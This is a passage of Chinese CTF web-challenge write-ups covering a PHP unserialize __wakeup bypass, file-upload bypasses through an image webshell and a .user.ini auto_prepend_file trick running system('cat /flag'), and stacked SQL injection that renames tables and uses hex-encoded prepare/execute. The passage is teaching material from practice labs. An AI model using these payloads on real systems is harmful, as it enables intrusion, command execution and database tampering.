<p><code>document.write(s[o%4][0]);s[o%4].splice(0,1)&#125;</code></p>
<p>因此我们要满足关键变量e的条件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">e.<span class="built_in">length</span>==<span class="number">16</span></span><br><span class="line">e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span></span><br><span class="line">e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span></span><br></pre></td></tr></table></figure></div>

<p>这里又用到了正则表达式<br><u>^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa</u>，其它的只要匹配到就好，没有位置要求<br>于是我们构造e的值</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">e</span><span class="operator">=</span>be0f233ac7be98aa</span><br></pre></td></tr></table></figure></div>

<p>将上面的核心代码后缀改为html格式，打开如下图所示<br>在这里插入图片描述<br>框中输入e的值<code>be0f233ac7be98aa</code>，点击Ok（当然你也可以在原来获得的web100文件浏览器执行的输入框中输入be0f233ac7be98aa）</p>
<p><img src="https://img-blog.csdnimg.cn/20190624211524604.png" alt="在这里插入图片描述"></p>
<p><strong>注1：当然，如果大家觉得构造麻烦，可以直接执行获取flag的核心代码，代码如下</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> t=[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> n=[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_h0l&quot;</span>,<span class="string">&quot;n&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> r=[<span class="string">&quot;g&#123;&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;_0&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> i=[<span class="string">&quot;it&#x27;&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;n&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> s=[t,n,r,i];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)&#123;</span></span><br><span class="line"><span class="language-javascript">             <span class="variable language_">document</span>.<span class="title function_">write</span>(s[o%<span class="number">4</span>][<span class="number">0</span>]);s[o%<span class="number">4</span>].<span class="title function_">splice</span>(<span class="number">0</span>,<span class="number">1</span>)&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="code"><pre><span class="line">document.write(<span class="regexp">s[o%4][0]</span>);s[o%4].splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"><span class="regexp">//</span>输出fl;随后删除fl</span><br><span class="line">/*</span><br><span class="line">代码运行详解：</span><br><span class="line">第一步：document.write(<span class="regexp">s[0][0]</span>);s[<span class="number">0</span>].splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">第二步：document.write(t[<span class="number">0</span>]);t.splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">第三步：document.write(<span class="string">&quot;fl&quot;</span>);删除t[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>]中第一个位置，一个项目，即删除fl</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">document.write的功能可以看一下这篇文章https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/qq_34986769/</span>article<span class="regexp">/details/</span><span class="number">52160532</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">splice</span><span class="params">()</span></span> 方法向/从数组中添加/删除项目，然后返回被删除的项目。</span><br><span class="line">注释：该方法会改变原始数组。</span><br><span class="line">语法</span><br><span class="line">arrayObject<span class="selector-class">.splice</span>(index,howmany,item1,.....,itemX)</span><br><span class="line">参数	                         描述</span><br><span class="line">index	                     必需。整数，规定添加/删除项目的位置，使用负数可从数组结尾处规定位置。</span><br><span class="line">howmany	                     必需。要删除的项目数量。如果设置为 <span class="number">0</span>，则不会删除项目。</span><br><span class="line">item1, ..., itemX	         可选。向数组添加的新项目。</span><br></pre></td></tr></table></figure></div>

<h2 id="13-unserialize3"><a href="#13-unserialize3" class="headerlink" title="13.unserialize3"></a>13.unserialize3</h2><h3 id="1-题目描述-22"><a href="#1-题目描述-22" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2）wp-7"><a href="#2）wp-7" class="headerlink" title="2）wp"></a>2）wp</h3><p>这道题需要了解<a href="../../../../2022/05/28/Web-study">php反序列化</a>中__wakeup漏洞的利用,还有<a href="../../../../2022/05/28/Web-study">php魔术方法</a></p>
<p><code>__wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</code></p>
<p>开始的代码不完整，是一段残缺的PHP代码，根据题目名字知道这是给反序列化的题目，?code=可能是提醒需要在url利用以GET方式提交code值</p>
<p><img src="https://img-blog.csdnimg.cn/669297deb27d4dce9bbdac477d78c6b7.png" alt="在这里插入图片描述"></p>
<p>下方是把代码补充完善后，并并调用序列化函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;                        <span class="comment">//定义一个名为xctf的类</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;       <span class="comment">//定义一个公有的类属性$flag，值为111</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;                                </span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line"><span class="comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();    </span><br><span class="line"><span class="comment">//使用new运算符来实例化该类（xctf）的对象为</span></span><br><span class="line"><span class="comment">//这里也就是定义了了一个新的类用来反序列化</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));       </span><br><span class="line"><span class="comment">//serialize()序列化函数</span></span><br><span class="line"><span class="comment">//输出被序列化的对象</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行该php代码，得到序列化后的字符串</p>
<p><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220627215806623.png" alt="image-20220627215806623"></p>
<p>如果看不懂，可以看看方便下图理解</p>
<p><img src="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>这里如果直接访问，会失败</p>
<p><code>http://111.200.241.244:54024/?code=O:4:%22xctf%22:1:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220627220136916.png" alt="image-20220627220136916"></p>
<p>因为我们忽略了<code>__wakeup()</code>，这里就需要了解php的魔术方法当中的绕过__wakeup()</p>
<p><code>如何绕过__wakeup()：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。从而绕过了__wakeup()函数</code></p>
<p>在这串序列化的代码中，对象属性数为1，把下列的1改为2(&gt;1)，即可</p>
<p><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p>–&gt;</p>
<p><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p>然后payload:<code>http://111.200.241.244:54024/?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</code></p>
<p>得到flag</p>
<p>补充：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COFFEESCRIPT"><figure class="iseeu highlight /coffeescript"><table><tr><td class="code"><pre><span class="line">php实例化：是指在面向对象的编程中，把用类创建对象的过程称为实例化，是将一个抽象的概念类，具体到该类实物的过程，实例化过程中一般由【类名 对象名 = <span class="keyword">new</span> 类名（参数<span class="number">1</span>，参数<span class="number">2.</span>..参数n）】构成。</span><br><span class="line"></span><br><span class="line">php类对象是什么意思？</span><br><span class="line">类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</span><br><span class="line">对象 − 是类的实例。</span><br><span class="line">在面向对象的程序设计（英语：<span class="built_in">Object</span>-oriented programming，缩写：OOP）中，对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。在现实世界里我们所面对的事情都是对象，如计算机、电视机、自行车等。</span><br></pre></td></tr></table></figure></div>

<h2 id="14-upload1"><a href="#14-upload1" class="headerlink" title="14.upload1"></a>14.upload1</h2><h3 id="1-题目描述-23"><a href="#1-题目描述-23" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-16"><a href="#2-wp-16" class="headerlink" title="2)wp"></a>2)wp</h3><p>典型的文件上传漏洞，可以先把upload-labs线下靶场学习一下</p>
<p>先直接上传php文件，发现被拦截</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704104557362.png" alt="image-20220704104557362"></p>
<p>于是构造一个图片木马上传，然后burp修改后缀，看看是不是前端验证</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704104752019.png" alt="image-20220704104752019"></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704104814064.png" alt="image-20220704104814064"></p>
<p>发现上传成功</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704104830480.png" alt="image-20220704104830480"></p>
<p>用蚁剑试着连一下</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704105115729.png" alt="image-20220704105115729"></p>
<p>发现连接成功，打开看看，在html下发现flag.php</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220704105139801.png" alt="image-20220704105139801"></p>
<p>打开文件</p>
<p>得到flag</p>
<hr>
<p>后面的题难度飞升，水平有限，后面的题仅写一些个人笔记，建议认真阅读其他大佬的wp，遇到难点，建议先巩固概念基础</p>
<h2 id="15-easytornado"><a href="#15-easytornado" class="headerlink" title="15.easytornado"></a>15.easytornado</h2><p>一道tornado框架题，属于ssti注入，建议先看一些文章</p>
<p>了解了再尝试完成</p>
<hr>
<h2 id="1-easyupload"><a href="#1-easyupload" class="headerlink" title="1.easyupload"></a>1.easyupload</h2><h3 id="1-题目描述-24"><a href="#1-题目描述-24" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>一名合格的黑客眼中，所有的上传点都是开发者留下的后门</p>
<h4 id="2-wp-17"><a href="#2-wp-17" class="headerlink" title="2)wp"></a>2)wp</h4><p><u><em>这道题写的1星，但是过滤又多，还涉及了上传.user.ini文件，学到了,下面是大佬的wp</em></u></p>
<p>本题需要利用文件上传漏洞点，通过绕过服务器的安全防护，达到getshell的目的</p>
<p>本题的主要考点为利用fastcgi的.user.ini特性进行任意命令执行</p>
<p>这里需要绕过的点如下</p>
<ul>
<li>检查文件内容是否有php字符串</li>
<li>检查后缀中是否有htaccess或ph</li>
<li>检查文件头部信息</li>
<li>文件MIME类型</li>
</ul>
<p>对于第一点可以利用短标签绕过，例如 <?=phpinfo();?></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">把short_open_tag 字段改为On，就可以实现短标签功能</span><br><span class="line"></span><br><span class="line">短标签：</span><br><span class="line"><span class="number">1</span>.能正常解析类似于这样形式的php文件： <span class="title function_ invoke__">phpinfo</span>() <span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.使用<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>的形式输出，在短标签看来，<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.<span class="meta">&lt;?=</span>(表达式)<span class="meta">?&gt;</span></span><br><span class="line">就相当于</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">正确：</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27; phpinfo();?&gt;&lt;? echo $a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">报错：</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;&lt;? phpinfo();?&gt;&lt;?=$a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">从这个对比试验我们可以看出：</span><br><span class="line">在短标签模式下，</span><br><span class="line">我们执行php语句php函数，都用类似于这样形式的php文件：</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">但是我们要输出一个flag，或者变量时，使用<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>的形式输出</span><br></pre></td></tr></table></figure></div>

<p>对于第二点可以通过上传.user.ini以及正常jpg文件来进行getshell,可以参考以下文章</p>
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">文章</a></p>
<p>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。</p>
<p> 这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。</p>
<p> 其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</p>
<p>第三点绕过方式即在文件头部添加一个图片的文件头，比如<code>GIF89a</code></p>
<p>第四点绕过方法即修改上传时的Content-Type</p>
<p>因此最终的payload为：<br> 上传.user.ini，内容为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line"><span class="attribute">auto_prepend_file</span>=a.jpg</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_file、<span class="built_in">auto</span>_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而<span class="built_in">auto</span>_append_file类似，只是在文件后面包含。 </span><br><span class="line"></span><br><span class="line">使用方法很简单，直接写在.user.ini中：</span><br></pre></td></tr></table></figure></div>

<p>上传a.jpg，内容为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
  </entry>
  <entry>
    <title>buuctf靶场wp</title>
    <url>/2022/06/21/buuctf-wp/</url>
    <content><![CDATA[<p><u><code>web各个方面选择了一些题目进行学习，感觉还是得第一次就应该看通彻，不应该留有问题，能够明白原理和代码中哪出造成这个的原因，反复嚼剩饭感觉浪费时间</code></u></p>
<span id="more"></span>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-强网杯-2019-随便注"><a href="#1-强网杯-2019-随便注" class="headerlink" title="1.[强网杯 2019]随便注"></a>1.[强网杯 2019]随便注</h2><h3 id="1）题目描述"><a href="#1）题目描述" class="headerlink" title="1）题目描述"></a>1）题目描述</h3><p>无</p>
<h3 id="2）wp"><a href="#2）wp" class="headerlink" title="2）wp"></a>2）wp</h3><p>因为之前没有了解过堆叠注入，这里挨个分析学习</p>
<p>先来确定sql注入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MATLAB"><figure class="iseeu highlight /matlab"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220701113045499.png" alt="image-20220701113045499"></p>
<p>然后试试显示所有数据，感觉看不到什么意思，后面一步步分析</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>;#</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220702105520465.png" alt="image-20220702105520465"></p>
<p>然后判断字段</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220701113210998.png" alt="image-20220701113210998"></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220701113228972.png" alt="image-20220701113228972"></p>
<p>判断处字段数为2</p>
<p>然后用<strong>联合注入</strong></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220701113604165.png" alt="image-20220701113604165"></p>
<p>发现select被正则匹配过滤了，用大小写绕过也不行，所以只能换一种方法</p>
<p>可以先了解<a href="../../../../2022/05/28/Web-study">堆叠注入</a>的概念和注入方式</p>
<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a><strong>堆叠注入</strong></h4><p>先查看所有的数据库</p>
<p><code>注：这里仍然要查询数据为假，比如-1，不然就不会执行后面的sql语句</code></p>
<p><code>;间隔sql语句</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">show</span> databases;<span class="meta">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220701224154901.png" alt="image-20220701224154901"></p>
<p>根据题目名字，先调用supersqli这个库的表看看</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">use</span> supersqli;<span class="keyword">show</span> tables;<span class="meta">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220701222551203.png" alt="image-20220701222551203"></p>
<p>看到有两个表，先看一下纯数字的表里的内容</p>
<p> <strong><u>注：当纯数字字符串是表名的时候需要加反引号`</u></strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;<span class="keyword">use</span> supersqli;<span class="keyword">show</span> columns from`<span class="number">1919810931114514</span>`;<span class="meta">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220701224603433.png" alt="image-20220701224603433"></p>
<p>看到flag在里面，再看看words里</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;use supersqli;show columns <span class="keyword">from</span> <span class="built_in">words</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220701233450179.png" alt="image-20220701233450179"></p>
<p><code>VARCHAR(M)是一种比CHAR更加灵活的数据类型，同样用于表示字符数据，但是VARCHAR可以保存可变长度的字符串</code></p>
<p>这里猜测，因为flag是字符串，所以猜测输入框查询的就是words表</p>
<p>后台sql语句可能（xx为输入框的内容）</p>
<p><code>select id,data from words where id=xx</code></p>
<hr>
<p>更改表名列名</p>
<p>1，通过 rename 先把 words 表改名为其他的表名。</p>
<p>2，把 1919810931114514 表的名字改为 words 。</p>
<p>3 ，给新 words 表添加新的列名 id 。</p>
<p>4，将 flag 改名为 data 。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>&#x27;;rename table `<span class="built_in">words</span>` <span class="keyword">to</span> words2;rename table `<span class="number">1919810931114514</span>` <span class="keyword">to</span> <span class="built_in">words</span>;alter table <span class="built_in">words</span> change flag <span class="built_in">id</span> varchar(<span class="number">100</span>);show tables;<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><code>show tables</code>主要看看改成功没有，这里改表名要有顺序，如果先改数字表，那就出现两个words表，导致语句不能执行，所以需要先改words表名为其他名字，然后修改数字表为words；避免因为名字而发生命令冲突</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220702220112706.png" alt="image-20220702220112706"></p>
<p>可以看到表<code>1919810931114514</code>名字被改成了可查询表<code>words</code></p>
<p>再看看words表的列，flag变成了id，NO变成了YES</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220702220308651.png" alt="image-20220702220308651"></p>
<p>用<code>1&#39; and 1=1#</code></p>
<p>看看回显数据</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220702221617795.png" alt="image-20220702221617795"></p>
<p>得到flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQl</span>的<span class="keyword">rename</span></span><br><span class="line">用于重命名表名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>的<span class="keyword">alter</span>用法总结</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>：删除列</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> <span class="keyword">COLUMN</span> 列名</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>：增加列</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> 列名 属性 【约束】</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>：修改列的类型信息</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 CHANGE <span class="keyword">COLUMN</span> 列名 【新】列名</span><br><span class="line">新属性</span><br><span class="line"><span class="number">4</span>：重命名列</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名字 CHANGE <span class="keyword">COLUMN</span> 列名 新列名 属性</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>：重命名表</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">RENAME</span> <span class="keyword">TO</span> 表新名</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>：删除表中主键</span><br><span class="line"></span><br><span class="line"><span class="keyword">Alter</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> <span class="keyword">primary key</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>：添加主键</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> 约束名 <span class="keyword">PRIMARY KEY</span> (添加列)</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>：添加索引</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">ADD</span> <span class="keyword">index</span> 索引名 (列名);</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>：修改列的属性</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 MODIFY <span class="keyword">COLUMN</span> 要修改属性的列名 新属性;</span><br><span class="line"></span><br><span class="line">一般情况下，不推荐在建表后对表进行大幅度修改，大幅度修改极有可能使表数据丢失。</span><br></pre></td></tr></table></figure></div>

<p>–</p>
<p>看了其他大佬的wp，这里补充两种方法</p>
<p><a href="https://blog.csdn.net/qq_44657899/article/details/103239145">原文链接</a></p>
<h4 id="解题思路2：预处理绕过select限制"><a href="#解题思路2：预处理绕过select限制" class="headerlink" title="解题思路2：预处理绕过select限制"></a><strong>解题思路2：<a href="https://so.csdn.net/so/search?q=%E9%A2%84%E5%A4%84%E7%90%86&spm=1001.2101.3001.7020">预处理</a>绕过select限制</strong></h4><p>因为select被过滤了，所以先将</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">` 1919810931114514 `</span></span><br></pre></td></tr></table></figure>

<p>进行16进制编码</p>
<p>再通过构造payload得</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">SeT</span><span class="variable">@a</span><span class="operator">=</span><span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> <span class="variable">@a</span>;<span class="keyword">execute</span> execsql;#</span><br></pre></td></tr></table></figure></div>

<p>进而得到flag</p>
<pre><code>prepare…from…是预处理语句，会进行编码转换。
execute用来执行由SQLPrepare创建的SQL语句。
SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20200125185407747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="解题思路3：handler绕过"><a href="#解题思路3：handler绕过" class="headerlink" title="解题思路3：handler绕过"></a><strong>解题思路3：<a href="https://so.csdn.net/so/search?q=handler&spm=1001.2101.3001.7020">handler</a>绕过</strong></h4><p>payload：</p>
